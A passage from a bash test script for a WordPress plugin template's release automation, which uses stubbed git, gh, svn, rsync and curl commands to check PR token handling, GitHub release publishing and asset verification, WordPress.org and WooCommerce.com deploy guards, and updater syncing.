  echo "PR automation leaked the explicit GH_TOKEN through git process arguments." >&2
  exit 1
fi
if grep -Fq "AUTHORIZATION: basic $expected_auth_header" "$PR_AUTH_GIT_LOG"; then
  echo "PR automation leaked the GitHub auth header through git process arguments." >&2
  exit 1
fi
if git -C "$pr_auth_fixture" config --local --get-regexp '^url\\..*\\.insteadOf$|^http\\..*\\.extraheader$' | grep -Eq 'fixture-pr-token|AUTHORIZATION: basic'; then
  echo "PR automation persisted GitHub token authentication in local git config." >&2
  exit 1
fi

pr_workflow_permission_fixture="$(mktemp -d)"
pr_workflow_permission_origin="$(mktemp -d)"
git init --bare -q "$pr_workflow_permission_origin"
git -C "$pr_workflow_permission_fixture" init -q
git -C "$pr_workflow_permission_fixture" config user.email "fixture@example.com"
git -C "$pr_workflow_permission_fixture" config user.name "Fixture"
mkdir -p "$pr_workflow_permission_fixture/.github/workflows"
cat > "$pr_workflow_permission_fixture/.github/workflows/ci.yml" <<'EOF'
name: CI
on: workflow_dispatch
jobs:
  noop:
    runs-on: ubuntu-latest
    steps:
      - run: true
EOF
git -C "$pr_workflow_permission_fixture" add .github/workflows/ci.yml
git -C "$pr_workflow_permission_fixture" commit -qm "init"
git -C "$pr_workflow_permission_fixture" branch -M main
git -C "$pr_workflow_permission_fixture" remote add origin "$pr_workflow_permission_origin"
printf '\n# managed change\n' >> "$pr_workflow_permission_fixture/.github/workflows/ci.yml"
pr_workflow_permission_helper_dir="$(mktemp -d)"
mkdir -p "$pr_workflow_permission_helper_dir/bin"
cat > "$pr_workflow_permission_helper_dir/bin/git" <<EOF
#!/usr/bin/env bash
for arg in "\$@"; do
  if [ "\$arg" = "push" ]; then
    echo "remote: error: refusing to allow a GitHub App to create or update workflow '.github/workflows/ci.yml' without \`workflows\` permission" >&2
    exit 1
  fi
done
exec "$real_git_path" "\$@"
EOF
chmod +x "$pr_workflow_permission_helper_dir/bin/git"
cat > "$pr_workflow_permission_helper_dir/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  echo '[]'
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$pr_workflow_permission_helper_dir/bin/gh"
pr_workflow_permission_log="$(mktemp)"
if (
  cd "$pr_workflow_permission_fixture"
  PATH="$pr_workflow_permission_helper_dir/bin:$PATH" \
    GH_TOKEN="fixture-gh-token" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/workflow-permission" \
      "main" \
      "fixture workflow permission" \
      "fixture workflow permission" \
      "$pr_stage_helper_dir/body.md"
) >"$pr_workflow_permission_log" 2>&1; then
  echo "PR automation unexpectedly succeeded after a workflow permission push rejection." >&2
  exit 1
fi
grep -Fq 'WP_PLUGIN_BASE_PR_TOKEN' "$pr_workflow_permission_log" || {
  echo "PR automation did not print workflow permission remediation guidance." >&2
  exit 1
}

release_publish_fixture="$(mktemp -d)"
cat > "$release_publish_fixture/notes.md" <<'EOF'
fixture release notes
EOF
cat > "$release_publish_fixture/asset.txt" <<'EOF'
asset
EOF
mkdir -p "$release_publish_fixture/bin"
cat > "$release_publish_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
log_file="${RELEASE_PUBLISH_LOG:?}"
printf '%s\n' "$*" >> "$log_file"
if [ "$1" = "release" ] && [ "$2" = "view" ]; then
  if [ "${RELEASE_ALREADY_EXISTS:-false}" = "true" ]; then
    exit 0
  fi
  exit 1
fi
if [ "$1" = "release" ] && [ "$2" = "upload" ] && [ "${RELEASE_UPLOAD_SHOULD_FAIL:-false}" = "true" ]; then
  echo "fixture upload failure" >&2
  exit 1
fi
if [ "$1" = "release" ] && { [ "$2" = "edit" ] || [ "$2" = "upload" ] || [ "$2" = "create" ]; }; then
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$release_publish_fixture/bin/gh"
release_publish_output="$release_publish_fixture/gh.log"
: > "$release_publish_output"
(
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=false \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
)
grep -Fq 'release create v1.2.3' "$release_publish_output"
grep -Fq -- '--verify-tag' "$release_publish_output"
grep -Fq -- '--latest=false' "$release_publish_output"
: > "$release_publish_output"
if (
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=true \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
); then
  echo "Release publication unexpectedly passed without --repair when the release already existed." >&2
  exit 1
fi
: > "$release_publish_output"
(
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=true \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      --repair \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
)
grep -Fq 'release edit v1.2.3' "$release_publish_output"
grep -Fq 'release upload v1.2.3' "$release_publish_output"
grep -Fq -- '--draft=false' "$release_publish_output"
grep -Fq -- '--latest=false' "$release_publish_output"
upload_line="$(grep -nF 'release upload v1.2.3' "$release_publish_output" | head -n 1 | cut -d: -f1)"
edit_line="$(grep -nF 'release edit v1.2.3' "$release_publish_output" | head -n 1 | cut -d: -f1)"
if [ "$upload_line" -ge "$edit_line" ]; then
  echo "Release repair must upload assets before publishing repaired metadata." >&2
  exit 1
fi
if grep -Fq 'release create' "$release_publish_output"; then
  echo "Release repair unexpectedly recreated the release instead of editing it." >&2
  exit 1
fi
: > "$release_publish_output"
(
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=false \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      --mark-latest \
      "v1.2.4" \
      "Release v1.2.4" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
)
grep -Fq 'release create v1.2.4' "$release_publish_output"
grep -Fq -- '--latest' "$release_publish_output"
if grep -Fq -- '--latest=false' "$release_publish_output"; then
  echo "Release publication with --mark-latest unexpectedly used --latest=false." >&2
  exit 1
fi
: > "$release_publish_output"
if (
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=true \
    RELEASE_UPLOAD_SHOULD_FAIL=true \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      --repair \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
); then
  echo "Release repair unexpectedly passed when asset replacement failed." >&2
  exit 1
fi
if grep -Fq 'release edit v1.2.3' "$release_publish_output"; then
  echo "Release repair edited release metadata after asset replacement failed." >&2
  exit 1
fi

release_verify_fixture="$(mktemp -d)"
mkdir -p "$release_verify_fixture/bin" "$release_verify_fixture/local" "$release_verify_fixture/remote"
cat > "$release_verify_fixture/local/plugin.zip" <<'EOF'
zip asset
EOF
cat > "$release_verify_fixture/local/plugin.zip.sbom.cdx.json" <<'EOF'
{"bomFormat":"CycloneDX"}
EOF
cat > "$release_verify_fixture/local/plugin.zip.sigstore.json" <<'EOF'
{"mediaType":"application/vnd.dev.sigstore.bundle+json"}
EOF
cp "$release_verify_fixture/local/"* "$release_verify_fixture/remote/"
cat > "$release_verify_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "release" ] && [ "$2" = "view" ]; then
  cat <<'JSON'
{
  "isDraft": false,
  "isPrerelease": false,
  "assets": [
    {"name": "plugin.zip", "size": 10},
    {"name": "plugin.zip.sbom.cdx.json", "size": 24},
    {"name": "plugin.zip.sigstore.json", "size": 57}
  ]
}
JSON
  exit 0
fi

if [ "$1" = "release" ] && [ "$2" = "download" ]; then
  shift 3
  download_dir=""
  pattern=""
  while [ "$#" -gt 0 ]; do
    case "$1" in
      --dir)
        download_dir="$2"
        shift 2
        ;;
      --pattern)
        pattern="$2"
        shift 2
        ;;
      --repo|--clobber)
        if [ "$1" = "--repo" ]; then
          shift 2
        else
          shift
        fi
        ;;
      *)
        shift
        ;;
    esac
  done
  cp "${RELEASE_VERIFY_REMOTE_DIR:?}/$pattern" "$download_dir/$pattern"
  exit 0
fi

echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$release_verify_fixture/bin/gh"
(
  cd "$release_verify_fixture"
  PATH="$release_verify_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_VERIFY_REMOTE_DIR="$release_verify_fixture/remote" \
    bash "$ROOT_DIR/scripts/release/verify_github_release_assets.sh" \
      "v1.2.3" \
      false \
      "$release_verify_fixture/local/plugin.zip" \
      "$release_verify_fixture/local/plugin.zip.sbom.cdx.json" \
      "$release_verify_fixture/local/plugin.zip.sigstore.json"
)
printf 'tampered\n' > "$release_verify_fixture/remote/plugin.zip"
if (
  cd "$release_verify_fixture"
  PATH="$release_verify_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_VERIFY_REMOTE_DIR="$release_verify_fixture/remote" \
    bash "$ROOT_DIR/scripts/release/verify_github_release_assets.sh" \
      "v1.2.3" \
      false \
      "$release_verify_fixture/local/plugin.zip" \
      "$release_verify_fixture/local/plugin.zip.sbom.cdx.json" \
      "$release_verify_fixture/local/plugin.zip.sigstore.json"
); then
  echo "Release asset verification unexpectedly passed with mismatched published bytes." >&2
  exit 1
fi

wordpress_org_deploy_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$wordpress_org_deploy_fixture/"
mkdir -p "$wordpress_org_deploy_fixture/bin"
cat > "$wordpress_org_deploy_fixture/bin/git" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "-C" ] && [ "$3" = "tag" ] && [ "$4" = "--list" ]; then
  printf '%s\n' "${WPORG_LATEST_REPO_VERSION:-1.2.3}"
  exit 0
fi
echo "Unexpected git invocation: $*" >&2
exit 1
EOF
cat > "$wordpress_org_deploy_fixture/bin/python3" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat > "$wordpress_org_deploy_fixture/bin/svn" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  checkout)
    target="${@: -1}"
    mkdir -p "$target"
    exit 0
    ;;
  update)
    if [ "$SVN_TAG_EXISTS" = "true" ]; then
      target_dir="${@: -1}"
      mkdir -p "$target_dir/tags/${WPORG_VERSION}"
    fi
    target_dir="${@: -1}"
    mkdir -p "$target_dir/trunk" "$target_dir/tags" "$target_dir/assets"
    exit 0
    ;;
  info)
    if [ "$SVN_TAG_EXISTS" = "true" ] && [[ "${@: -1}" = */tags/${WPORG_VERSION} ]]; then
      exit 0
    fi
    exit 1
    ;;
  status)
    exit 0
    ;;
  add|delete|commit)
    exit 0
    ;;
esac
echo "Unexpected svn invocation: $*" >&2
exit 1
EOF
cat > "$wordpress_org_deploy_fixture/bin/rsync" <<'EOF'
#!/usr/bin/env bash
destination="${@: -1}"
if [[ " $* " == *" -ani "* ]] && [ "${WPORG_TAG_DIFFERS:-false}" = "true" ] && [[ "$destination" = */tags/${WPORG_VERSION}/ ]]; then
  printf '%s\n' 'deleting stale-file.php'
fi
exit 0
EOF
chmod +x "$wordpress_org_deploy_fixture/bin/git" "$wordpress_org_deploy_fixture/bin/python3" "$wordpress_org_deploy_fixture/bin/svn" "$wordpress_org_deploy_fixture/bin/rsync"
if (
  cd "$wordpress_org_deploy_fixture"
  PATH="$wordpress_org_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$wordpress_org_deploy_fixture" \
    SVN_USERNAME=fixture-user \
    SVN_PASSWORD=fixture-pass \
    SVN_TAG_EXISTS=true \
    WPORG_TAG_DIFFERS=true \
    WPORG_VERSION=1.2.3 \
    bash "$ROOT_DIR/scripts/release/deploy_wordpress_org.sh" "1.2.3" ".wp-plugin-base.env" "$wordpress_org_deploy_fixture"
); then
  echo "WordPress.org deploy unexpectedly allowed an existing release tag to be mutated." >&2
  exit 1
fi
if (
  cd "$wordpress_org_deploy_fixture"
  PATH="$wordpress_org_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$wordpress_org_deploy_fixture" \
    SVN_USERNAME=fixture-user \
    SVN_PASSWORD=fixture-pass \
    SVN_TAG_EXISTS=true \
    WPORG_TAG_DIFFERS=true \
    WPORG_VERSION=1.2.3 \
    WPORG_LATEST_REPO_VERSION=1.3.0 \
    WP_PLUGIN_BASE_ALLOW_WPORG_TAG_REDEPLOY=true \
    bash "$ROOT_DIR/scripts/release/deploy_wordpress_org.sh" "1.2.3" ".wp-plugin-base.env" "$wordpress_org_deploy_fixture"
); then
  echo "WordPress.org repair deploy unexpectedly allowed an older release tag to overwrite trunk." >&2
  exit 1
fi
(
  cd "$wordpress_org_deploy_fixture"
  PATH="$wordpress_org_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$wordpress_org_deploy_fixture" \
    SVN_USERNAME=fixture-user \
    SVN_PASSWORD=fixture-pass \
    SVN_TAG_EXISTS=true \
    WPORG_TAG_DIFFERS=true \
    WPORG_VERSION=1.2.3 \
    WPORG_LATEST_REPO_VERSION=1.2.3 \
    WP_PLUGIN_BASE_ALLOW_WPORG_TAG_REDEPLOY=true \
    bash "$ROOT_DIR/scripts/release/deploy_wordpress_org.sh" "1.2.3" ".wp-plugin-base.env" "$wordpress_org_deploy_fixture"
)

forbidden_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$forbidden_fixture/"
mkdir -p "$forbidden_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$forbidden_fixture/.wp-plugin-base/"
touch "$forbidden_fixture/.DS_Store"
if WP_PLUGIN_BASE_ROOT="$forbidden_fixture" bash "$ROOT_DIR/scripts/ci/check_forbidden_files.sh" >/dev/null 2>&1; then
  echo "Forbidden file policy unexpectedly accepted .DS_Store." >&2
  exit 1
fi

grep -Fq 'Deploy to WordPress.org (post-publish)' "$ROOT_DIR/.github/workflows/finalize-release.yml"
grep -Fq 'Deploy to WooCommerce.com Marketplace (post-publish)' "$ROOT_DIR/.github/workflows/finalize-release.yml"
grep -Fq 'Deploy to WordPress.org (post-publish)' "$ROOT_DIR/templates/child/.github/workflows/finalize-release.yml"
grep -Fq 'Deploy to WooCommerce.com Marketplace (post-publish)' "$ROOT_DIR/templates/child/.github/workflows/finalize-release.yml"

woocommerce_deploy_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$woocommerce_deploy_fixture/"
perl -0pi -e "s/\* Version: 1\.2\.3\n/\* Version: 1.2.3\n * Woo: 12345:abc123def456\n/" "$woocommerce_deploy_fixture/standard-plugin.php"
cat >> "$woocommerce_deploy_fixture/.wp-plugin-base.env" <<'EOF_CONFIG'
WOOCOMMERCE_COM_PRODUCT_ID=12345
EOF_CONFIG
WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" bash "$ROOT_DIR/scripts/ci/build_zip.sh"

if WOO_COM_USERNAME=fixture-user WOO_COM_APP_PASSWORD=fixture-pass WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
  bash "$ROOT_DIR/scripts/release/validate_woocommerce_com_deploy.sh" "1.2.3" ".wp-plugin-base.env" "$woocommerce_deploy_fixture/dist/package/standard-plugin" >/dev/null 2>&1; then
  :
else
  echo "WooCommerce.com preflight unexpectedly failed for valid fixture input." >&2
  exit 1
fi

if WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" bash "$ROOT_DIR/scripts/release/validate_woocommerce_com_deploy.sh" "1.2.3" ".wp-plugin-base.env" "$woocommerce_deploy_fixture/dist/package/standard-plugin" >/dev/null 2>&1; then
  echo "WooCommerce.com preflight unexpectedly passed without credentials." >&2
  exit 1
fi

perl -0pi -e 's/^WOOCOMMERCE_COM_PRODUCT_ID=.*\n//m' "$woocommerce_deploy_fixture/.wp-plugin-base.env"
if ! WOO_COM_USERNAME=fixture-user WOO_COM_APP_PASSWORD=fixture-pass WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
  bash "$ROOT_DIR/scripts/release/validate_woocommerce_com_deploy.sh" "1.2.3" ".wp-plugin-base.env" "$woocommerce_deploy_fixture/dist/package/standard-plugin" >/dev/null 2>&1; then
  echo "WooCommerce.com preflight unexpectedly failed while WOOCOMMERCE_COM_PRODUCT_ID was intentionally unset for soft-skip." >&2
  exit 1
fi

if ! WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
  bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip" >/dev/null 2>&1; then
  echo "WooCommerce.com deploy unexpectedly failed soft-skip when WOOCOMMERCE_COM_PRODUCT_ID was unset and credentials were absent." >&2
  exit 1
fi

echo 'WOOCOMMERCE_COM_PRODUCT_ID=99999' >> "$woocommerce_deploy_fixture/.wp-plugin-base.env"
if WOO_COM_USERNAME=fixture-user WOO_COM_APP_PASSWORD=fixture-pass WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
  bash "$ROOT_DIR/scripts/release/validate_woocommerce_com_deploy.sh" "1.2.3" ".wp-plugin-base.env" "$woocommerce_deploy_fixture/dist/package/standard-plugin" >/dev/null 2>&1; then
  echo "WooCommerce.com preflight unexpectedly accepted a Woo header/product-id mismatch." >&2
  exit 1
fi
perl -0pi -e 's/^WOOCOMMERCE_COM_PRODUCT_ID=.*\n//mg' "$woocommerce_deploy_fixture/.wp-plugin-base.env"
echo 'WOOCOMMERCE_COM_PRODUCT_ID=12345' >> "$woocommerce_deploy_fixture/.wp-plugin-base.env"

mkdir -p "$woocommerce_deploy_fixture/bin"
cat > "$woocommerce_deploy_fixture/bin/curl" <<'EOF_CURL'
#!/usr/bin/env bash
set -euo pipefail
if [ "${WOO_CURL_SHOULD_NOT_RUN:-false}" = "true" ]; then
  echo "curl should not have been called" >&2
  exit 99
fi
args="$*"
emit_response() {
  local body="$1"
  local status="${2:-200}"
  if [[ "$args" == *"%{http_code}"* ]]; then
    printf '%s\n%s\n' "$body" "$status"
  else
    printf '%s\n' "$body"
  fi
}
if [[ "$args" == *"/deploy/status"* ]]; then
  case "${WOO_CURL_SCENARIO:-queue_success}" in
    timeout)
      exit 28
      ;;
    conflict)
      emit_response '{"status":"running","version":"1.2.2"}'
      ;;
    already_live)
      emit_response '{"status":"complete","version":"1.2.3"}'
      ;;
    higher_live)
      emit_response '{"status":"complete","version":"1.2.4"}'
      ;;
    status_error)
      emit_response '{"code":"status_error","message":"status failure"}' 500
      ;;
    upload_fail|queue_success)
      emit_response '{"code":"submission_runner_no_deploy_in_progress"}'
      ;;
    *)
      emit_response '{"code":"submission_runner_no_deploy_in_progress"}'
      ;;
  esac
  exit 0
fi
if [[ "$args" == *"/deploy"* ]]; then
  case "${WOO_CURL_SCENARIO:-queue_success}" in
    timeout)
      exit 28
      ;;
    upload_fail)
      emit_response '{"code":"upload_failed","message":"upload failure"}'
      ;;
    queue_success)
      emit_response '{"success":123}'
      ;;
    *)
      emit_response '{"success":456}'
      ;;
  esac
  exit 0
fi
echo "Unexpected curl invocation: $*" >&2
exit 1
EOF_CURL
chmod +x "$woocommerce_deploy_fixture/bin/curl"

if (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=conflict \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip"
); then
  echo "WooCommerce.com deploy unexpectedly passed when another deployment was in progress." >&2
  exit 1
fi

if ! (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=already_live \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip" >/dev/null
); then
  echo "WooCommerce.com deploy unexpectedly failed for already-live version short-circuit." >&2
  exit 1
fi

if (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=higher_live \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip"
); then
  echo "WooCommerce.com deploy unexpectedly passed when a higher version was already live." >&2
  exit 1
fi

if ! (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=queue_success \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip" >/dev/null
); then
  echo "WooCommerce.com deploy unexpectedly failed for queue-success flow." >&2
  exit 1
fi

if (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=status_error \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip"
); then
  echo "WooCommerce.com deploy unexpectedly passed when status API returned an HTTP error." >&2
  exit 1
fi

if (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=upload_fail \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip"
); then
  echo "WooCommerce.com deploy unexpectedly passed when upload API returned an error code." >&2
  exit 1
fi

if (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SCENARIO=timeout \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip"
); then
  echo "WooCommerce.com deploy unexpectedly passed when status/upload requests timed out." >&2
  exit 1
fi

if ! (
  cd "$woocommerce_deploy_fixture"
  PATH="$woocommerce_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$woocommerce_deploy_fixture" \
    WOO_COM_USERNAME=fixture-user \
    WOO_COM_APP_PASSWORD=fixture-pass \
    WOO_CURL_SHOULD_NOT_RUN=true \
    WP_PLUGIN_BASE_REPAIR_MODE=true \
    bash "$ROOT_DIR/scripts/release/deploy_woocommerce_com.sh" "1.2.3" ".wp-plugin-base.env" "dist/standard-plugin.zip" >/dev/null
); then
  echo "WooCommerce.com deploy unexpectedly failed in repair-mode short-circuit." >&2
  exit 1
fi

woocommerce_status_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$woocommerce_status_fixture/"
mkdir -p "$woocommerce_status_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$woocommerce_status_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$woocommerce_status_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if [ -e "$woocommerce_status_fixture/.github/workflows/woocommerce-status.yml" ]; then
  echo "WooCommerce status workflow was unexpectedly synced without WOOCOMMERCE_COM_PRODUCT_ID." >&2
  exit 1
fi
echo 'WOOCOMMERCE_COM_PRODUCT_ID=12345' >> "$woocommerce_status_fixture/.wp-plugin-base.env"
WP_PLUGIN_BASE_ROOT="$woocommerce_status_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if [ ! -f "$woocommerce_status_fixture/.github/workflows/woocommerce-status.yml" ]; then
  echo "WooCommerce status workflow was not synced after WOOCOMMERCE_COM_PRODUCT_ID was configured." >&2
  exit 1
fi

updater_disabled_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$updater_disabled_fixture/"
mkdir -p "$updater_disabled_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$updater_disabled_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$updater_disabled_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if [ -e "$updater_disabled_fixture/lib/wp-plugin-base/wp-plugin-base-github-updater.php" ]; then
  echo "Updater runtime files were unexpectedly present while feature was disabled." >&2
  exit 1
fi

updater_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$updater_fixture/"
cat >> "$updater_fixture/.wp-plugin-base.env" <<'EOF_CONFIG'
GITHUB_RELEASE_UPDATER_ENABLED=true
GITHUB_RELEASE_UPDATER_REPO_URL=https://github.com/example/standard-plugin
EOF_CONFIG
echo "require_once __DIR__ . '/lib/wp-plugin-base/wp-plugin-base-github-updater.php';" >> "$updater_fixture/standard-plugin.php"
mkdir -p "$updater_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$updater_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$updater_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
WP_PLUGIN_BASE_ROOT="$updater_fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh"
WP_PLUGIN_BASE_ROOT="$updater_fixture" bash "$ROOT_DIR/scripts/ci/build_zip.sh"
updater_zip_listing="$(unzip -Z1 "$updater_fixture/dist/standard-plugin.zip")"
grep -Fq 'standard-plugin/lib/wp-plugin-base/wp-plugin-base-github-updater.php' <<<"$updater_zip_listing"
grep -Fq 'standard-plugin/lib/wp-plugin-base/plugin-update-checker/plugin-update-checker.php' <<<"$updater_zip_listing"

cat > "$updater_fixture/lib/wp-plugin-base/plugin-update-checker/plugin-update-checker.php" <<'EOF'
<?php
namespace YahnisElsts\PluginUpdateChecker\v5;

class PucFactory {
  public static $built = array();

  public static function buildUpdateChecker( $source_url, $main_file, $slug ) {
    self::$built[] = array( $source_url, $main_file, $slug );
    return new Fixture_Checker();
  }
}

class Fixture_Checker {
  public function getVcsApi() {
    return new Fixture_Vcs_Api();
  }
}

class Fixture_Vcs_Api {
  public function enableReleaseAssets( $pattern ) {
    $GLOBALS['wp_plugin_base_runtime_updater_asset_pattern'] = $pattern;
  }
}
EOF

WP_PLUGIN_BASE_UPDATER_FILE="$updater_fixture/lib/wp-plugin-base/wp-plugin-base-runtime-updater.php" php <<'PHP'
<?php
define( 'ABSPATH', '/' );
function is_admin() {
  return false;
}
function wp_doing_cron() {
  return false;
}
function apply_filters( $hook_name, $value ) {
  return $value;
}

require getenv( 'WP_PLUGIN_BASE_UPDATER_FILE' );

if ( class_exists( '\\YahnisElsts\\PluginUpdateChecker\\v5\\PucFactory', false ) ) {
  fwrite( STDERR, "Runtime updater unexpectedly loaded Plugin Update Checker on a frontend request.\n" );
  exit( 1 );
}
PHP

WP_PLUGIN_BASE_UPDATER_FILE="$updater_fixture/lib/wp-plugin-base/wp-plugin-base-runtime-updater.php" php <<'PHP'
<?php
define( 'ABSPATH', '/' );
function is_admin() {
  return true;
}
function wp_doing_cron() {
  return false;
}
function apply_filters( $hook_name, $value ) {
  return $value;
}

require getenv( 'WP_PLUGIN_BASE_UPDATER_FILE' );

if ( ! class_exists( '\\YahnisElsts\\PluginUpdateChecker\\v5\\PucFactory', false ) ) {
  fwrite( STDERR, "Runtime updater did not load Plugin Update Checker in admin context.\n" );
  exit( 1 );
}

if ( 1 !== count( \YahnisElsts\PluginUpdateChecker\v5\PucFactory::$built ) ) {
  fwrite( STDERR, "Runtime updater did not build exactly one update checker.\n" );
  exit( 1 );
